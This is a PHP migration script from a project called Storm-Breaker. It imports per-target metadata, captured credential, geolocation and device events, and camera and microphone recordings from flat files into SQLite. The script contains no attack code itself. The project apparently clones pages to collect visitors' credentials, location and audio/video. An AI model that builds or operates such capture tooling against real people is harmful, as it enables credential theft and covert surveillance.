<?php
/**
 * tools/migrate-to-sqlite.php — one-shot migration from flat files to SQLite.
 *
 * Run from project root:
 *   php storm-web/tools/migrate-to-sqlite.php
 *
 * Reads:
 *   - targets/<slug>/meta.json        → targets table
 *   - targets/<slug>/result.txt       → events table
 *   - targets/<slug>/captures/*.png   → media table (files stay on disk)
 *   - targets/<slug>/audio/*.webm     → media table (files stay on disk)
 *   - log/notifications-state.json    → kv table
 *
 * Safe to run multiple times — uses INSERT OR IGNORE so duplicates are skipped.
 */

require_once __DIR__ . '/../lib/store.php';
require_once __DIR__ . '/../lib/cloner.php';

$targets_root = realpath(__DIR__ . '/..') . '/targets';
$log_dir      = realpath(__DIR__ . '/..') . '/log';

echo "Storm-Breaker: flat-file → SQLite migration\n";
echo str_repeat('─', 50) . "\n";

// Force DB creation & schema.
$pdo = store_open();
echo "✓ Database ready at " . realpath(STORE_DB_PATH) . "\n\n";

$stats = ['targets' => 0, 'events' => 0, 'media' => 0, 'skipped' => 0];

foreach (scandir($targets_root) ?: [] as $slug) {
    if ($slug === '.' || $slug === '..' || $slug === '.gitkeep') continue;
    $dir = $targets_root . '/' . $slug;
    if (!is_dir($dir)) continue;

    echo "─ Target: $slug\n";

    // 1. meta.json → targets table
    $meta_path = "$dir/meta.json";
    if (is_file($meta_path)) {
        $meta = json_decode((string) file_get_contents($meta_path), true);
        if (is_array($meta)) {
            $existing = store_target_get($slug);
            if ($existing === null) {
                store_target_create(
                    $slug,
                    (string) ($meta['url'] ?? ''),
                    (string) ($meta['host'] ?? ''),
                    is_array($meta['payloads'] ?? null) ? $meta['payloads'] : [],
                    is_array($meta['consent'] ?? null)  ? $meta['consent']  : [],
                    (string) ($meta['render_mode'] ?? 'http'),
                    (string) ($meta['custom_js'] ?? '')
                );
                // Patch created_at to the original value.
                if (isset($meta['created_at'])) {
                    $pdo->prepare("UPDATE targets SET created_at = :ts WHERE slug = :slug")
                        ->execute([':ts' => (int) $meta['created_at'], ':slug' => $slug]);
                }
                $stats['targets']++;
                echo "  ✓ meta.json imported\n";
            } else {
                $stats['skipped']++;
                echo "  · meta.json already in DB\n";
            }
        }
    }

    // 2. result.txt → events table
    $rt = "$dir/result.txt";
    if (is_file($rt)) {
        $fp = @fopen($rt, 'rb');
        if ($fp !== false) {
            $line_count = 0;
            while (($line = fgets($fp)) !== false) {
                $line = trim($line);
                if ($line === '') continue;
                if (!preg_match('/^\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]\s+([A-Z]+)\s+(.*)$/s', $line, $m)) {
                    continue;
                }
                $ts = strtotime($m[1] . ' UTC');
                if ($ts === false) continue;

                $kind_raw = strtolower($m[2]);
                if (!in_array($kind_raw, ['device', 'geo', 'cred', 'consent'], true)) continue;

                $payload = json_decode(trim($m[3]), true);
                if (!is_array($payload)) $payload = ['raw' => mb_substr(trim($m[3]), 0, 4000)];

                try {
                    store_event_add($slug, $kind_raw, $payload, $ts);
                    $stats['events']++;
                    $line_count++;
                } catch (PDOException $e) {
                    // Likely duplicate — skip silently.
                    $stats['skipped']++;
                }
            }
            fclose($fp);
            echo "  ✓ $line_count events from result.txt\n";
        }
    }

    // 3. captures/*.png → media table
    $cap_dir = "$dir/captures";
    if (is_dir($cap_dir)) {
        $cap_count = 0;
        foreach (scandir($cap_dir) ?: [] as $f) {
            if ($f === '.' || $f === '..') continue;
            if (!preg_match('/^(\d{9,11})_[a-f0-9]{1,12}\.png$/', $f, $fm)) continue;
            $ts   = (int) $fm[1];
            $size = (int) @filesize("$cap_dir/$f");
            try {
                store_media_register($slug, 'camera', $f, $size, $ts);
                $stats['media']++;
                $cap_count++;
            } catch (PDOException $e) {
                $stats['skipped']++;
            }
        }
        if ($cap_count > 0) echo "  ✓ $cap_count camera frames\n";
    }

    // 4. audio/*.webm → media table
    $a_dir = "$dir/audio";
    if (is_dir($a_dir)) {
        $a_count = 0;
        foreach (scandir($a_dir) ?: [] as $f) {
            if ($f === '.' || $f === '..') continue;
            if (!preg_match('/^(\d{9,11})_[a-f0-9]{1,12}\.webm$/', $f, $fm)) continue;
            $ts   = (int) $fm[1];
            $size = (int) @filesize("$a_dir/$f");
            try {
                store_media_register($slug, 'mic', $f, $size, $ts);
                $stats['media']++;
                $a_count++;
            } catch (PDOException $e) {
                $stats['skipped']++;
            }
        }
        if ($a_count > 0) echo "  ✓ $a_count audio clips\n";
    }
}

// 5. notifications-state.json → kv table
$notif_state = "$log_dir/notifications-state.json";
if (is_file($notif_state)) {
    $ns = json_decode((string) file_get_contents($notif_state), true);
    if (is_array($ns) && isset($ns['last_seen_at'])) {
        store_kv_set('notif_last_seen_at', (string) $ns['last_seen_at']);
        echo "\n✓ notifications-state.json → kv (last_seen_at={$ns['last_seen_at']})\n";
    }
}

echo "\n" . str_repeat('─', 50) . "\n";
echo "Done: {$stats['targets']} targets, {$stats['events']} events, {$stats['media']} media";
if ($stats['skipped'] > 0) echo ", {$stats['skipped']} skipped (duplicates)";
echo "\n";
